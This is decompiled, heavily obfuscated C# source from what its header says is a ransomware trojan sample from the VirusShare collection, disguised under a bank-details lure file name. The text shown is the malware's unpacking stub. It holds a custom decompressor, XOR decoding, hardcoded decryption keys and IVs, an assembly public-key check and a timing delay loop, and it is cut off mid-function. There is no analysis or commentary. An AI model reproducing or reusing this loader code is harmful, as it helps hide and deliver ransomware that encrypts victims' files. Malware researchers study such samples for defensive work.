// Decompiled with JetBrains decompiler
// Type: .
// Assembly: beneficiary company bank account details 001.jpag, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 45951A1E-6C69-4939-A079-D79B455FB68E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-f63007f190a25c9f524ffaa3d2cf3a70fb59174dee5f92c351987d7532770a77.exe

using \u0001;
using \u0002;
using \u0006;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0002
{
  internal class \u0004
  {
    static void \u0001([In] \u0003.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1;
        do
        {
          int num2 = obj2;
          int num3;
          while (true)
          {
            num3 = num2 - 1;
            if (false)
              num2 = num3;
            else
              break;
          }
          if (true)
            goto label_15;
label_10:
          if (num2 > 0)
          {
            byte[] numArray1 = obj0.\u0001;
            \u0003.\u0003 obj = obj0;
            int num4 = obj.\u0001;
            if (true)
              goto label_12;
label_3:
            obj.\u0001 = num4 + 1;
            int num5;
            int index1 = num5;
            byte[] numArray2 = obj0.\u0001;
            int index2 = obj1;
            int num6 = index2 + 1;
            if (true)
              goto label_13;
label_4:
            int num7 = (int) numArray2[index2];
            numArray1[index1] = (byte) num7;
            obj0.\u0001 &= (int) short.MaxValue;
            num1 = obj1;
            if (true)
              num1 &= (int) short.MaxValue;
            continue;
label_13:
            obj1 = num6;
            goto label_4;
label_12:
            num5 = num4;
            goto label_3;
          }
          else
            goto label_16;
label_15:
          obj2 = num3;
          goto label_10;
        }
        while (false);
        obj1 = num1;
      }
label_16:;
    }

    static byte[] \u0001([In] string obj0, [In] byte[] obj1)
    {
      int num1;
      byte[] numArray1;
      if (true)
      {
        byte[] numArray2 = \u0013.\u007E\u0015((object) \u0012.\u0013(), obj0);
        if (true)
          goto label_19;
label_2:
        int num2 = (int) obj1[checked (obj1.Length - 1)] ^ 112;
        if (true)
        {
          num1 = num2;
          goto label_3;
        }
        else
          goto label_3;
label_19:
        numArray1 = numArray2;
        goto label_2;
      }
label_3:
      int num3 = obj1.Length;
      if (true)
        num3 = num3;
      byte[] numArray3 = new byte[checked (num3 + 1)];
      if (true)
        goto label_21;
label_6:
      int num4 = 0;
      int num5 = checked (obj1.Length - 1);
label_7:
      if (true)
        goto label_22;
label_8:
      if (true)
        goto label_23;
label_17:
      byte[] numArray4;
      int index1;
      int num6;
      int num7;
      for (; index1 <= num6; index1 = num7)
      {
        int index2;
        numArray4[index1] = checked ((byte) ((int) obj1[index1] ^ num1 ^ (int) numArray1[index2]));
        num7 = index2;
        if (true)
        {
          int num8 = checked (\u0014.\u007E\u0016((object) obj0) - 1);
          if (num7 == num8)
          {
            if (true)
              index2 = 0;
          }
          else
          {
            int num9 = index2;
            int num10 = 1;
            if (num10 == 0)
            {
              num5 = num10;
              num4 = num9;
              goto label_7;
            }
            else
              index2 = checked (num9 + num10);
          }
          num7 = checked (index1 + 1);
        }
      }
      return (byte[]) \u0015.\u0017((Array) numArray4, (Array) new byte[checked (obj1.Length - 2 + 1)]);
label_23:
      index1 = num4;
      goto label_17;
label_22:
      num6 = num5;
      goto label_8;
label_21:
      numArray4 = numArray3;
      goto label_6;
    }

    static void \u0001([In] \u0003.\u0002 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0001 >>= obj1;
      do
      {
        if (true)
          obj0.\u0003 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static bool \u0001([In] \u0003.\u0002 obj0) => obj0.\u0001 == obj0.\u0002;

    static void \u0001([In] int obj0)
    {
label_0:
      Stopwatch stopwatch1 = new Stopwatch();
      if (true)
        goto label_8;
label_1:
      Stopwatch stopwatch2;
      do
      {
        if (true)
        {
          \u0016 obj = \u0016.\u007E\u0018;
          Stopwatch stopwatch3 = stopwatch2;
          if (true)
            goto label_9;
label_3:
          continue;
label_9:
          obj((object) stopwatch3);
          goto label_3;
        }
        else
          goto label_0;
      }
      while (false);
      while (\u0017.\u007E\u001C((object) stopwatch2) < (long) obj0)
      {
        global::\u0001 obj = global::\u0001.\u0002;
        if (true)
          obj();
      }
      \u0016 obj1 = \u0016.\u007E\u0019;
      Stopwatch stopwatch4 = stopwatch2;
      if (false)
        return;
      obj1((object) stopwatch4);
      return;
label_8:
      stopwatch2 = stopwatch1;
      goto label_1;
    }

    static void \u0001([In] \u0003 obj0)
    {
      do
      {
        if (true)
          obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      while (false);
    }

    static void \u0001([In] \u0005 obj0)
    {
      do
      {
        if (true)
          obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      while (false);
    }

    static int \u0001([In] \u0003.\u0003 obj0, [In] \u0003.\u0002 obj1, [In] int obj2)
    {
      int val1 = obj2;
      if (true)
      {
        int val2 = 32768 - obj0.\u0002;
        val1 = Math.Min(val1, val2);
      }
      int val2_1 = \u0004.\u0001(obj1);
      int num1 = Math.Min(val1, val2_1);
      int num2;
      while (true)
      {
        if (true)
          goto label_15;
label_4:
        num2 = 32768;
        if (num2 == 0)
        {
          num1 = num2;
          continue;
        }
        break;
label_15:
        obj2 = num1;
        goto label_4;
      }
      int num3 = num2 - obj0.\u0001;
      if (true)
        goto label_16;
label_6:
      int num4;
      int num5;
      do
      {
        if (obj2 > num4)
        {
          if (true)
          {
            int num6 = \u0004.\u0001(obj1, obj0.\u0001, obj0.\u0001, num4);
            if (true)
              goto label_17;
label_9:
            if (num5 != num4)
              goto label_13;
            else
              goto label_10;
label_17:
            num5 = num6;
            goto label_9;
          }
label_10:
          int num7 = num5 + \u0004.\u0001(obj1, obj0.\u0001, 0, obj2 - num4);
          if (true)
            num5 = num7;
        }
        else
        {
          int num8 = \u0004.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
          if (true)
            num5 = num8;
        }
label_13:
        obj0.\u0001 = obj0.\u0001 + num5 & (int) short.MaxValue;
      }
      while (false);
      obj0.\u0002 += num5;
      return num5;
label_16:
      num4 = num3;
      goto label_6;
    }

    static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      if (true)
        goto label_18;
label_1:
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
      if (true)
        goto label_19;
label_2:
      byte[] numArray1;
      int num1 = numArray1 == null ? 1 : 0;
      byte[] numArray2;
      int num2;
      int num3;
      if (true)
      {
        num3 = numArray2 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_15;
label_4:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (numArray1 != null)
      {
        if (true)
        {
          index = 0;
          goto label_16;
        }
        else
          goto label_16;
      }
      else
        goto label_17;
label_10:
      num3 = (int) numArray2[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_2;
      }
      else
        goto label_4;
label_15:
      if (true)
        index = num1;
label_16:
      if (index < numArray1.Length)
      {
        num2 = (int) numArray1[index];
        goto label_10;
      }
label_17:
      return true;
label_19:
      numArray1 = publicKey2;
      goto label_2;
label_18:
      numArray2 = publicKey1;
      goto label_1;
    }

    static bool \u0001([In] \u0003.\u0001 obj0)
    {
      int num1 = \u0004.\u0001(obj0.\u0001);
      if (true)
        goto label_35;
label_32:
      int num2;
      int num3 = num2;
      int num4;
      for (int index1 = 258; num3 >= index1; num3 = num4)
      {
        int index2;
        int num5;
        do
        {
          int num6 = obj0.\u0001;
          if (true)
            goto label_36;
label_2:
          int num7;
          num4 = num7;
          num5 = 7;
          if (num5 != 0)
          {
            switch (num4 - num5)
            {
              case 0:
                int num8;
                do
                {
                  int num9 = \u0004.\u0001(obj0.\u0001, obj0.\u0001);
                  if (true)
                    goto label_39;
label_10:
                  if ((num9 & -256) != 0)
                    goto label_11;
label_5:
                  \u0003.\u0003 obj = obj0.\u0001;
                  int num10 = index2;
                  if (true)
                    goto label_37;
label_6:
                  num8 = num2 - 1;
                  if (true)
                    goto label_38;
label_7:
                  continue;
label_38:
                  num2 = num8;
                  goto label_7;
label_37:
                  \u0004.\u0001(obj, num10);
                  goto label_6;
label_11:
                  if (index2 < 257)
                  {
                    if (false)
                      goto label_5;
                    else
                      goto label_13;
                  }
                  else
                    goto label_17;
label_39:
                  index2 = num9;
                  goto label_10;
                }
                while (num8 >= 258);
                return true;
label_13:
                if (index2 < 0)
                  return false;
                obj0.\u0002 = (\u0003.\u0004) null;
                obj0.\u0001 = (\u0003.\u0004) null;
                continue;
              case 1:
                goto label_18;
              case 2:
                goto label_24;
              case 3:
                goto label_27;
              default:
                goto label_32;
            }
          }
          else
            goto label_4;
label_36:
          num7 = num6;
          goto label_2;
        }
        while (false);
        obj0.\u0001 = 2;
        return true;
label_17:
        obj0.\u0003 = \u0003.\u0001.\u0001[index2 - 257];
        obj0.\u0002 = \u0003.\u0001.\u0002[index2 - 257];
label_18:
        if (obj0.\u0002 > 0)
        {
          obj0.\u0001 = 8;
          int num11 = \u0004.\u0001(obj0.\u0001, obj0.\u0002);
          if (true)
            goto label_40;
label_20:
          int num12;
          if (num12 < 0)
            return false;
          \u0004.\u0001(obj0.\u0001, obj0.\u0002);
          obj0.\u0003 += num12;
          goto label_23;
label_40:
          num12 = num11;
          goto label_20;
        }
label_23:
        obj0.\u0001 = 9;
label_24:
        index2 = \u0004.\u0001(obj0.\u0002, obj0.\u0001);
        if (index2 < 0)
          return false;
        obj0.\u0004 = \u0003.\u0001.\u0003[index2];
        obj0.\u0002 = \u0003.\u0001.\u0004[index2];
label_27:
        if (obj0.\u0002 > 0)
        {
          obj0.\u0001 = 10;
          int num13 = \u0004.\u0001(obj0.\u0001, obj0.\u0002);
          if (num13 < 0)
            return false;
          \u0004.\u0001(obj0.\u0001, obj0.\u0002);
          obj0.\u0004 += num13;
        }
        \u0004.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
        num2 -= obj0.\u0003;
        obj0.\u0001 = 7;
        goto label_32;
label_4:
        index1 = num5;
      }
      return true;
label_35:
      num2 = num1;
      goto label_32;
    }

    static void \u0001([In] \u0003.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      \u0003.\u0003 obj3 = obj0;
      int num1 = obj3.\u0002 + obj1;
      if (true)
        goto label_14;
label_1:
      obj3.\u0002 = num1;
      int num2;
      if (num2 > 32768)
        throw new InvalidOperationException();
      int num3 = obj0.\u0001 - obj2 & (int) short.MaxValue;
      if (true)
        goto label_15;
label_4:
      int num4 = 32768 - obj1;
      if (true)
        goto label_16;
label_5:
      int num5;
      int num6;
      if (num5 <= num6 && obj0.\u0001 < num6)
      {
        if (obj1 <= obj2)
        {
          byte[] sourceArray = obj0.\u0001;
          int sourceIndex = num5;
          byte[] destinationArray = obj0.\u0001;
          int destinationIndex = obj0.\u0001;
          int length = obj1;
          if (true)
            goto label_17;
label_8:
          obj0.\u0001 += obj1;
          return;
label_17:
          Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
          goto label_8;
        }
        else
        {
          while (obj1-- > 0)
          {
            byte[] numArray1 = obj0.\u0001;
            \u0003.\u0003 obj4 = obj0;
            int num7 = obj4.\u0001;
            if (true)
              goto label_18;
label_10:
            obj4.\u0001 = num7 + 1;
            int index1 = num2;
            byte[] numArray2 = obj0.\u0001;
            int index2 = num5;
            int num8 = index2 + 1;
            if (true)
              goto label_19;
label_11:
            int num9 = (int) numArray2[index2];
            numArray1[index1] = (byte) num9;
            continue;
label_19:
            num5 = num8;
            goto label_11;
label_18:
            num2 = num7;
            goto label_10;
          }
          return;
        }
      }
      else
      {
        \u0004.\u0001(obj0, num5, obj1, obj2);
        return;
      }
label_16:
      num6 = num4;
      goto label_5;
label_15:
      num5 = num3;
      goto label_4;
label_14:
      num2 = num1;
      goto label_1;
    }

    static int \u0001([In] \u0003.\u0002 obj0)
    {
      int num1 = obj0.\u0002;
      int num2;
      int num3;
      while (true)
      {
        num2 = obj0.\u0001;
        if (true)
        {
          num3 = num1 - num2;
          if (false)
            num1 = num3;
          else
            break;
        }
        else
          goto label_4;
      }
      num2 = obj0.\u0003;
      num1 = num3;
label_4:
      int num4;
      while (true)
      {
        num4 = num2 >> 3;
        if (false)
          num2 = num4;
        else
          break;
      }
      return num1 + num4;
    }

    static int \u0001([In] \u0003.\u0002 obj0, [In] int obj1)
    {
      if (obj0.\u0003 < obj1)
      {
        if (obj0.\u0001 == obj0.\u0002)
        {
          if (true)
            return -1;
        }
        else
        {
          \u0003.\u0002 obj2 = obj0;
          int num1 = (int) obj2.\u0001;
          byte[] numArray1 = obj0.\u0001;
          \u0003.\u0002 obj3 = obj0;
          int num2 = obj3.\u0001;
          if (true)
            goto label_14;
label_5:
          obj3.\u0001 = num2 + 1;
          int num3;
          int index1 = num3;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = obj0.\u0001;
          \u0003.\u0002 obj4 = obj0;
          int num5 = obj4.\u0001;
          if (true)
            goto label_15;
label_6:
          obj4.\u0001 = num5 + 1;
          int index2 = num3;
          int num6 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num7 = (num4 | num6) << obj0.\u0003;
          obj2.\u0001 = (uint) (num1 | num7);
          obj0.\u0003 += 16;
          goto label_7;
label_15:
          num3 = num5;
          goto label_6;
label_14:
          num3 = num2;
          goto label_5;
        }
      }
label_7:
      long num8 = (long) obj0.\u0001;
      int num9 = 1;
      int num10 = obj1;
      int num11;
      do
      {
        if (true)
        {
          int num12 = num10 & 31;
          num11 = num9 << num12;
          if (true)
          {
            num10 = 1;
            num9 = num11;
          }
          else
            goto label_16;
        }
      }
      while (num10 == 0);
      int num13 = num9 - num10;
      goto label_13;
label_16:
      num13 = num11;
label_13:
      long num14 = (long) num13;
      return (int) (num8 & num14);
    }

    static int \u0001([In] \u0003.\u0002 obj0) => obj0.\u0003;

    static bool \u0001([In] \u0003.\u0001 obj0)
    {
      int num1;
      int num2;
      while (true)
      {
        int num3 = obj0.\u0001;
        if (true)
          goto label_40;
label_2:
        if (true)
        {
          int num4;
          int num5;
          switch (num1)
          {
            case 2:
              if (obj0.\u0001)
              {
                obj0.\u0001 = 12;
                return false;
              }
              int num6 = \u0004.\u0001(obj0.\u0001, 3);
              if (true)
              {
                num2 = num6;
                goto label_8;
              }
              else
                goto label_8;
            case 3:
              \u0003.\u0001 obj = obj0;
              int num7 = \u0004.\u0001(obj0.\u0001, 16);
              if (true)
                goto label_45;
label_22:
              obj.\u0005 = num7;
              num4 = num1;
              num5 = 0;
              if (num5 == 0)
              {
                if (num4 < num5)
                  return false;
                \u0004.\u0001(obj0.\u0001, 16);
                obj0.\u0001 = 4;
                goto case 4;
              }
              else
                break;
label_45:
              num1 = num7;
              goto label_22;
            case 4:
              int num8 = \u0004.\u0001(obj0.\u0001, 16);
              num5 = 0;
              num4 = num8;
              break;
            case 5:
label_30:
              int num9 = \u0004.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
              obj0.\u0005 -= num9;
              if (obj0.\u0005 != 0)
                return !\u0004.\u0001(obj0.\u0001);
              obj0.\u0001 = 2;
              return true;
            case 6:
              if (!\u0004.\u0001(obj0.\u0001, obj0.\u0001))
                return false;
              obj0.\u0001 = \u0004.\u0001(obj0.\u0001);
              obj0.\u0002 = \u0004.\u0001(obj0.\u0001);
              obj0.\u0001 = 7;
              goto case 7;
            case 7:
            case 8:
            case 9:
            case 10:
              return \u0004.\u0001(obj0);
            case 12:
              return false;
            default:
              int num10 = 0;
              return num10 != 0 ? num10 != 0 : num10 != 0;
          }
          if (num4 < num5)
            return false;
          \u0004.\u0001(obj0.\u0001, 16);
          obj0.\u0001 = 5;
          goto label_30;
        }
        else
          continue;
label_40:
        num1 = num3;
        goto label_2;
      }
label_8:
      if (num2 < 0)
        return false;
      do
      {
        \u0003.\u0002 obj1 = obj0.\u0001;
        if (true)
          goto label_42;
label_11:
        if ((num2 & 1) != 0)
          obj0.\u0001 = true;
        int num11 = num2 >> 1;
        if (true)
          goto label_43;
label_14:
        switch (num1)
        {
          case 0:
            \u0003.\u0002 obj2 = obj0.\u0001;
            if (true)
              goto label_44;
label_16:
            obj0.\u0001 = 3;
            goto label_20;
label_44:
            \u0004.\u0001(obj2);
            goto label_16;
          case 1:
            obj0.\u0001 = \u0003.\u0004.\u0001;
            obj0.\u0002 = \u0003.\u0004.\u0002;
            obj0.\u0001 = 7;
            goto label_20;
          case 2:
            continue;
          default:
            goto label_20;
        }
label_43:
        num1 = num11;
        goto label_14;
label_42:
        \u0004.\u0001(obj1, 3);
        goto label_11;
      }
      while (false);
      obj0.\u0001 = new \u0003.\u0005();
      obj0.\u0001 = 6;
label_20:
      return true;
    }

    static byte[] \u0001([In] byte[] obj0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_51;
label_1:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if (true)
        goto label_52;
label_2:
      Assembly assembly1;
      Assembly assembly2;
      if ((object) assembly1 != (object) assembly2 && !\u0004.\u0001(assembly2, assembly1))
        return (byte[]) null;
      \u0003.\u0007 obj1 = new \u0003.\u0007(obj0);
      if (true)
        goto label_53;
label_5:
      byte[] numArray1 = new byte[0];
      if (true)
        goto label_54;
label_6:
      \u0003.\u0007 obj2;
      int num1 = \u0004.\u0001(obj2);
      if (true)
        goto label_55;
label_7:
      int num2;
      int num3;
      if (num2 == 67324752)
      {
        int num4 = (int) (short) \u0004.\u0001(obj2);
        if (true)
          goto label_56;
label_9:
        int num5 = \u0004.\u0001(obj2);
        int num6 = \u0004.\u0001(obj2);
        short num7;
        if (num2 != 67324752 || num7 != (short) 20 || num5 != 0 || num6 != 8)
          throw new FormatException("Wrong Header Signature");
        \u0004.\u0001(obj2);
        \u0004.\u0001(obj2);
        num3 = \u0004.\u0001(obj2);
        goto label_12;
label_56:
        num7 = (short) num4;
        goto label_9;
      }
      else
        goto label_17;
label_12:
      int length1 = \u0004.\u0001(obj2);
      int count1 = \u0004.\u0001(obj2);
      int count2 = \u0004.\u0001(obj2);
      if (count1 > 0)
      {
        byte[] buffer = new byte[count1];
        obj2.Read(buffer, 0, count1);
      }
label_14:
      if (count2 <= 0)
        goto label_16;
label_15:
      byte[] buffer1 = new byte[count2];
      obj2.Read(buffer1, 0, count2);
label_16:
      byte[] buffer2 = new byte[obj2.Length - obj2.Position];
      obj2.Read(buffer2, 0, buffer2.Length);
      \u0003.\u0001 obj3 = new \u0003.\u0001(buffer2);
      byte[] numArray2 = new byte[length1];
      \u0004.\u0001(numArray2, 0, numArray2.Length, obj3);
      goto label_50;
label_17:
      int num8 = num2 >> 24;
      if (true)
      {
        if (num2 - (num8 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        int length2;
        int num9;
        if (num8 == 1)
        {
          num3 = \u0004.\u0001(obj2);
          if (true)
          {
            length2 = num3;
            if (true)
            {
              numArray2 = new byte[length2];
              num9 = 0;
              goto label_26;
            }
            else
              goto label_14;
          }
          else
            goto label_12;
        }
        else
          goto label_27;
label_25:
        int length3;
        byte[] buffer3 = new byte[length3];
        obj2.Read(buffer3, 0, buffer3.Length);
        \u0003.\u0001 obj4 = new \u0003.\u0001(buffer3);
        int num10;
        \u0004.\u0001(numArray2, num9, num10, obj4);
        num9 += num10;
label_26:
        if (num9 < length2)
        {
          int num11 = \u0004.\u0001(obj2);
          if (true)
          {
            num10 = \u0004.\u0001(obj2);
            length3 = num11;
            goto label_25;
          }
          else
            goto label_40;
        }
label_27:
        if (num8 == 2)
        {
          byte[] numArray3 = new byte[8]
          {
            (byte) 65,
            (byte) 38,
            (byte) 218,
            (byte) 10,
            (byte) 75,
            (byte) 38,
            (byte) 114,
            (byte) 36
          };
          byte[] numArray4 = new byte[8]
          {
            (byte) 208,
            (byte) 55,
            (byte) 68,
            (byte) 47,
            (byte) 9,
            (byte) 54,
            (byte) 189,
            (byte) 73
          };
          using (\u0005 obj5 = new \u0005())
          {
            using (ICryptoTransform cryptoTransform = \u0004.\u0001(true, numArray4, numArray3, obj5))
              numArray2 = \u0004.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
        byte[] numArray5;
        byte[] numArray6;
        if (num8 == 3)
        {
          length3 = 16;
          if (length3 != 0)
          {
            byte[] numArray7 = new byte[length3];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray7, __fieldref (\u0004.\u0001));
            numArray5 = numArray7;
            numArray6 = new byte[16]
            {
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2
            };
          }
          else
            goto label_25;
        }
        else
          goto label_50;
label_40:
        using (\u0003 obj6 = new \u0003())
        {
          using (ICryptoTransform cryptoTransform = \u0004.\u0001(true, numArray6, numArray5, obj6))
            numArray2 = \u0004.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      else
        goto label_15;
label_50:
      obj2.Close();
      return numArray2;
label_55:
      num2 = num1;
      goto label_7;
label_54:
      numArray2 = numArray1;
      goto label_6;
label_53:
      obj2 = obj1;
      goto label_5;
label_52:
      assembly2 = executingAssembly;
      goto label_2;
label_51:
      assembly1 = callingAssembly;
      goto label_1;
    }

    static \u0003.\u0004 \u0001([In] \u0003.\u0005 obj0)
    {
      byte[] numArray1 = new byte[obj0.\u0002];
      if (true)
        goto label_3;
label_1:
      byte[] sourceArray = obj0.\u0002;
      byte[] numArray2;
      byte[] destinationArray = numArray2;
      int length = obj0.\u0002;
      if (true)
        goto label_4;
label_2:
      return new \u0003.\u0004(numArray2);
label_4:
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length);
      goto label_2;
label_3:
      numArray2 = numArray1;
      goto label_1;
    }

    static int \u0001([In] \u0003.\u0004 obj0, [In] \u0003.\u0002 obj1)
    {
      int num1 = \u0004.\u0001(obj1, 9);
      if (true)
        goto label_27;
label_1:
      int index;
      int num2;
      int num3;
      int num4;
      int num5;
      int num6;
      int num7;
      int num8;
      while (true)
      {
        int num9;
        if (num1 >= 0)
        {
          int num10 = (int) obj0.\u0001[index];
          int num11;
          while (true)
          {
            if (true)
              goto label_28;
label_4:
            num11 = 0;
            if (num11 != 0)
            {
              num10 = num11;
              continue;
            }
            break;
label_28:
            num2 = num10;
            goto label_4;
          }
          if (num10 < num11)
          {
            int num12 = -(num2 >> 4);
            if (true)
              goto label_30;
label_9:
            int num13 = num2 & 15;
            if (true)
              goto label_31;
label_10:
            int num14;
            num8 = \u0004.\u0001(obj1, num14);
            if (true)
              goto label_32;
label_11:
            if (true)
            {
              if (num8 < 0)
              {
                num9 = obj1.\u0003;
                index = \u0004.\u0001(obj1, num9);
                num6 = (int) obj0.\u0001[num3 | index >> 9];
                goto label_17;
              }
              else
                goto label_13;
            }
            else
              goto label_14;
label_32:
            index = num8;
            goto label_11;
label_31:
            num14 = num13;
            goto label_10;
label_30:
            num3 = num12;
            goto label_9;
          }
          else
            break;
        }
        else
          goto label_21;
label_17:
        num2 = num6;
        if ((num2 & 15) <= num9)
        {
          \u0004.\u0001(obj1, num2 & 15);
          num7 = num2 >> 4;
          if (false)
          {
            num1 = num7;
            continue;
          }
          goto label_15;
        }
        else
          goto label_20;
label_21:
        num4 = obj1.\u0003;
        index = \u0004.\u0001(obj1, num4);
        num5 = (int) obj0.\u0001[index];
        if (num5 >= 0)
        {
          num6 = num5 & 15;
          if (true)
          {
            if (false)
              goto label_17;
            else
              goto label_24;
          }
          else
            goto label_33;
        }
        else
          goto label_26;
      }
      \u0003.\u0002 obj = obj1;
      int num15 = num2 & 15;
      if (true)
        goto label_29;
label_7:
      return num2 >> 4;
label_29:
      \u0004.\u0001(obj, num15);
      goto label_7;
label_13:
      int num16 = (int) obj0.\u0001[num3 | index >> 9];
      \u0004.\u0001(obj1, num16 & 15);
      num8 = num16;
label_14:
      return num8 >> 4;
label_15:
      return num7;
label_20:
      return -1;
label_33:
      return num6;
label_24:
      int num17 = num4;
      if (num6 <= num17)
      {
        \u0004.\u0001(obj1, num5 & 15);
        return num5 >> 4;
      }
label_26:
      return -1;
label_27:
      index = num1;
      goto label_1;
    }

    static int \u0001([In] \u0003.\u0003 obj0) => obj0.\u0002;

    static int \u0001([In] \u0003.\u0007 obj0) => \u0004.\u0001(obj0) | \u0004.\u0001(obj0) << 16;

    static void \u0001([In] \u0003.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] byte[] obj2,
      [In] \u0005 obj3)
    {
      MethodInfo setMethod1 = obj3.\u0001.GetProperty("Key").GetSetMethod();
      object obj4 = obj3.\u0001;
      object[] objArray1 = new object[1];
      if (true)
        goto label_4;
label_1:
      object[] objArray2;
      objArray2[0] = (object) obj2;
      object[] parameters1 = objArray2;
      setMethod1.Invoke(obj4, parameters1);
      MethodInfo setMethod2 = obj3.\u0001.GetProperty("IV").GetSetMethod();
      object obj5 = obj3.\u0001;
      object[] objArray3 = new object[1];
      if (true)
        goto label_5;
label_2:
      objArray2[0] = (object) obj1;
      object[] parameters2 = objArray2;
      setMethod2.Invoke(obj5, parameters2);
      MethodInfo method = obj3.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
      if (true)
        goto label_6;
label_3:
      MethodInfo methodInfo;
      return (ICryptoTransform) methodInfo.Invoke(obj3.\u0001, new object[0]);
label_6:
      methodInfo = method;
      goto label_3;
label_5:
      objArray2 = objArray3;
      goto label_2;
label_4:
      objArray2 = objArray1;
      goto label_1;
    }

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] byte[] obj2,
      [In] \u0003 obj3)
    {
      MethodInfo setMethod1 = obj3.\u0001.GetProperty("Key").GetSetMethod();
      object obj4 = obj3.\u0001;
      object[] objArray1 = new object[1];
      if (true)
        goto label_4;
label_1:
      object[] objArray2;
      objArray2[0] = (object) obj2;
      object[] parameters1 = objArray2;
      setMethod1.Invoke(obj4, parameters1);
      MethodInfo setMethod2 = obj3.\u0001.GetProperty("IV").GetSetMethod();
      object obj5 = obj3.\u0001;
      object[] objArray3 = new object[1];
      if (true)
        goto label_5;
label_2:
      objArray2[0] = (object) obj1;
      object[] parameters2 = objArray2;
      setMethod2.Invoke(obj5, parameters2);
      MethodInfo method = obj3.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
      if (true)
        goto label_6;
label_3:
      MethodInfo methodInfo;
      return (ICryptoTransform) methodInfo.Invoke(obj3.\u0001, new object[0]);
label_6:
      methodInfo = method;
      goto label_3;
label_5:
      objArray2 = objArray3;
      goto label_2;
label_4:
      objArray2 = objArray1;
      goto label_1;
    }

    static short \u0001([In] int obj0) => (short) ((int) \u0003.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0003.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0003.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0003.\u0006.\u0001[obj0 >> 12]);

    static void \u0001([In] int obj0, [In] int obj1, [In] \u0003.\u0002 obj2, [In] byte[] obj3)
    {
      int num1;
      if (true)
      {
        if (obj2.\u0001 < obj2.\u0002)
          throw new InvalidOperationException();
        int num2 = obj1 + obj0;
        if (true)
          goto label_10;
label_4:
        if (0 > obj1 || obj1 > num1 || num1 > obj3.Length)
          throw new ArgumentOutOfRangeException();
        if ((obj0 & 1) != 0)
        {
          obj2.\u0001 |= (uint) (((int) obj3[obj1++] & (int) byte.MaxValue) << obj2.\u0003);
          goto label_8;
        }
        else
          goto label_9;
label_10:
        num1 = num2;
        goto label_4;
      }
label_8:
      obj2.\u0003 += 8;
label_9:
      obj2.\u0001 = obj3;
      obj2.\u0001 = obj1;
      obj2.\u0002 = num1;
    }

    static \u0003.\u0004 \u0001([In] \u0003.\u0005 obj0)
    {
      byte[] numArray1 = new byte[obj0.\u0003];
      if (true)
        goto label_3;
label_1:
      byte[] sourceArray = obj0.\u0002;
      int sourceIndex = obj0.\u0002;
      byte[] numArray2;
      byte[] destinationArray = numArray2;
      int length = obj0.\u0003;
      if (true)
        goto label_4;
label_2:
      return new \u0003.\u0004(numArray2);
label_4:
      Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, 0, length);
      goto label_2;
label_3:
      numArray2 = numArray1;
      goto label_1;
    }

    static int \u0001([In] int obj0, [In] byte[] obj1, [In] \u0003.\u0003 obj2, [In] int obj3)
    {
      int num1 = obj2.\u0001;
      if (true)
        goto label_18;
label_1:
      int num2;
      int num3;
      int num4;
      if (obj0 > obj2.\u0002)
      {
        obj0 = obj2.\u0002;
      }
      else
      {
        num3 = obj2.\u0001 - obj2.\u0002;
        num4 = obj0;
        if (true)
        {
          int num5 = num3 + num4 & (int) short.MaxValue;
          if (true)
            num2 = num5;
        }
        else
          goto label_12;
      }
label_5:
      int num6;
      do
      {
        int num7 = obj0;
        if (true)
          goto label_20;
label_6:
        continue;
label_20:
        num6 = num7;
        goto label_6;
      }
      while (false);
      int num8 = obj0 - num2;
      if (true)
        goto label_21;
label_8:
      int num9;
      while (num9 > 0)
      {
        byte[] sourceArray = obj2.\u0001;
        int sourceIndex = 32768 - num9;
